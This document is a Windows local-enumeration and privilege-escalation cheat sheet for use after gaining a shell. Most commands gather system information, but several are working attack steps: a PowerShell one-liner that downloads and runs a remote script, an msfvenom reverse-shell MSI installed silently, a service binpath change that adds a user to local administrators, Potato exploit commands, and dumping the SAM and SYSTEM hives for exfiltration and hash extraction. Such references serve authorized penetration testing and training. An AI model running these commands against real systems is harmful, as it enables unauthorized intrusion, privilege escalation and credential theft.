Windows Local Enumeration - Cheat Sheet

Enumerate a Windows machine from the inside after landing a shell.
Focus: local system only — no AD, no domain tools.
Organized by goal. Replace the placeholders (<...>) with your own values.


════════════════════════════════════════════════════════════════════
AUTOMATED TOOLS (run these first)
════════════════════════════════════════════════════════════════════

winPEAS — most comprehensive, color-coded output:

    winpeas.exe
    winpeas.exe quiet    # less output, faster
    winpeas.exe cmd      # run cmd checks only

    Download: github.com/carlospolop/PEASS-ng/releases

Seatbelt — targeted security checks (C#):

    Seatbelt.exe -group=all
    Seatbelt.exe -group=user      # user-specific checks only
    Seatbelt.exe CredEnum         # credential enumeration
    Seatbelt.exe TokenPrivileges  # token privilege checks

PrivescCheck (PowerShell, no binary needed):

    IEX (New-Object Net.WebClient).DownloadString('http://<ip>/PrivescCheck.ps1')
    Invoke-PrivescCheck
    Invoke-PrivescCheck -Extended -Report report -Format HTML,CSV


════════════════════════════════════════════════════════════════════
SYSTEM INFORMATION
════════════════════════════════════════════════════════════════════

    systeminfo                          # OS, version, hotfixes, arch
    hostname
    whoami
    echo %OS% %PROCESSOR_ARCHITECTURE%

    # PowerShell:
    Get-ComputerInfo | Select-Object OsName,OsVersion,OsArchitecture,CsName
    [System.Environment]::OSVersion


════════════════════════════════════════════════════════════════════
USERS & GROUPS
════════════════════════════════════════════════════════════════════

Current user:

    whoami
    whoami /all                         # user, groups, and privileges in one shot
    whoami /groups                      # group memberships
    whoami /priv                        # token privileges (key for privesc)

Local users:

    net user                            # list all local users
    net user <username>                 # details on a specific user
    wmic useraccount list brief

    # PowerShell:
    Get-LocalUser
    Get-LocalUser | Select-Object Name,Enabled,LastLogon

Local groups:

    net localgroup                      # list all local groups
    net localgroup administrators       # who is a local admin?
    net localgroup "Remote Desktop Users"

    # PowerShell:
    Get-LocalGroup
    Get-LocalGroupMember -Group "Administrators"

Currently logged-in users:

    query user
    query session


════════════════════════════════════════════════════════════════════
TOKEN PRIVILEGES (whoami /priv)
════════════════════════════════════════════════════════════════════

Run whoami /priv and look for these — each is a privesc path:

    SeImpersonatePrivilege      → Potato attacks (PrintSpoofer, GodPotato, JuicyPotato)
    SeAssignPrimaryToken        → same Potato family
    SeBackupPrivilege           → read any file (SAM, SYSTEM, NTDS.dit)
    SeRestorePrivilege          → write any file
    SeDebugPrivilege            → attach to SYSTEM processes (lsass dump)
    SeTakeOwnershipPrivilege    → take ownership of any object
    SeLoadDriverPrivilege       → load a malicious driver → kernel privesc
    SeShutdownPrivilege         → (minor) can reboot the machine

    Potato quick reference:
        PrintSpoofer.exe -i -c cmd
        GodPotato -cmd "cmd /c whoami"


════════════════════════════════════════════════════════════════════
NETWORK INFORMATION
════════════════════════════════════════════════════════════════════

    ipconfig /all                       # interfaces, IPs, DNS, DHCP
    netstat -ano                        # open ports + PID
    route print                         # routing table
    arp -a                              # ARP cache — other hosts on the network
    netsh firewall show state           # firewall status (older)
    netsh advfirewall show allprofiles  # firewall status (newer)

Map PID from netstat to process name:

    tasklist /fi "PID eq <pid>"

    # PowerShell — port + process in one:
    Get-NetTCPConnection | Select-Object LocalPort,State,OwningProcess |
        Sort-Object LocalPort


════════════════════════════════════════════════════════════════════
RUNNING PROCESSES & SERVICES
════════════════════════════════════════════════════════════════════

Processes:

    tasklist /v                         # all processes with owner + memory
    tasklist /svc                       # processes with hosted services
    wmic process get name,processid,commandline

    # PowerShell:
    Get-Process | Select-Object Name,Id,Path

Services:

    sc query state= all                 # all services (note the space after =)
    sc qc <service-name>               # config of a specific service (binpath!)
    wmic service get name,startmode,pathname,state

    # PowerShell:
    Get-Service
    Get-WmiObject Win32_Service | Select-Object Name,State,PathName,StartMode


════════════════════════════════════════════════════════════════════
INSTALLED SOFTWARE
════════════════════════════════════════════════════════════════════

    wmic product get name,version
    reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s
    reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s

    # PowerShell:
    Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
        Select-Object DisplayName,DisplayVersion


════════════════════════════════════════════════════════════════════
SCHEDULED TASKS
════════════════════════════════════════════════════════════════════

    schtasks /query /fo LIST /v        # all tasks — verbose
    schtasks /query /fo CSV /nh        # CSV format — easier to parse

    Look for:
      Tasks running as SYSTEM
      Task actions pointing to writable files or directories

    # PowerShell:
    Get-ScheduledTask | Where-Object {$_.Principal.UserId -eq "SYSTEM"} |
        Select-Object TaskName,TaskPath


════════════════════════════════════════════════════════════════════
PRIVESC CHECKS
════════════════════════════════════════════════════════════════════

── AlwaysInstallElevated ────────────────────────────────────────────

MSI files run as SYSTEM if both keys are set to 1:

    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

    If both = 0x1:
        msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f msi -o evil.msi
        msiexec /quiet /qn /i evil.msi


── Unquoted Service Paths ───────────────────────────────────────────

If a service binary path has spaces and no quotes, Windows tries each
prefix as an executable:
    C:\Program Files\Vuln App\service.exe
    → tries C:\Program.exe, then C:\Program Files\Vuln.exe

Find them:

    wmic service get name,pathname,startmode |
        findstr /i "auto" | findstr /iv "c:\windows\\"

    # PowerShell:
    Get-WmiObject Win32_Service |
        Where-Object {$_.PathName -notmatch '"' -and $_.PathName -match ' '} |
        Select-Object Name,PathName


── Weak Service Permissions ─────────────────────────────────────────

Check if you can reconfigure a service binary path:

    accesschk.exe -uwcqv * /accepteula     # all services your user can write
    accesschk.exe -uwcqv "<service>" /accepteula

    If SERVICE_CHANGE_CONFIG or WRITE_DAC → change binpath:
        sc config <service> binpath= "cmd /c net localgroup administrators <user> /add"
        sc stop <service>
        sc start <service>


── Registry Autoruns ────────────────────────────────────────────────

Executables that run at startup — check if path is writable:

    reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

    # PowerShell:
    Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"


════════════════════════════════════════════════════════════════════
INTERESTING FILES & CREDENTIALS
════════════════════════════════════════════════════════════════════

PowerShell command history:

    type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    type C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

Search for passwords in common file types:

    findstr /si password *.txt *.ini *.xml *.config *.bat *.ps1
    findstr /si "password\|pwd\|pass\|secret" C:\*.txt C:\*.ini

Interesting directories to check:

    dir C:\Users\<user>\Desktop
    dir C:\Users\<user>\Documents
    dir C:\Users\<user>\AppData\Roaming
    dir C:\inetpub\wwwroot            # web root — config files
    dir C:\xampp\htdocs               # XAMPP installs

SAM and SYSTEM hives (NT hashes — if accessible):

    reg save HKLM\SAM C:\Temp\SAM
    reg save HKLM\SYSTEM C:\Temp\SYSTEM
    # Then exfil and run: secretsdump.py -sam SAM -system SYSTEM LOCAL

Saved credentials (Windows Credential Manager):

    cmdkey /list                       # list saved credentials
    # Use with: runas /savecred /user:<user> cmd.exe

Unattend / Sysprep files (often contain plaintext passwords):

    dir /s /b C:\*unattend*.xml C:\*sysprep*.xml C:\*unattend*.ini
    type C:\Windows\Panther\unattend.xml
    type C:\Windows\System32\sysprep\unattend.xml


════════════════════════════════════════════════════════════════════
RECOMMENDED WORKFLOW
════════════════════════════════════════════════════════════════════

1. whoami /all              → check token privileges first (instant wins)
2. winpeas.exe              → automated sweep (covers 90% of checks)
3. systeminfo               → OS version → look up known kernel exploits
4. net localgroup admins    → who else has admin?
5. schtasks + sc query      → writable task/service paths?
6. reg query AlwaysInstallElevated
7. PS history + findstr password → plaintext creds

Key ideas:
- whoami /priv is the first thing to check — SeImpersonatePrivilege alone is often game over.
- winPEAS covers most of this automatically but understand what it's looking for.
- Unattend.xml and PS history are the two most common sources of plaintext creds.
- Unquoted service paths and weak service permissions require a restart to trigger — factor in timing.
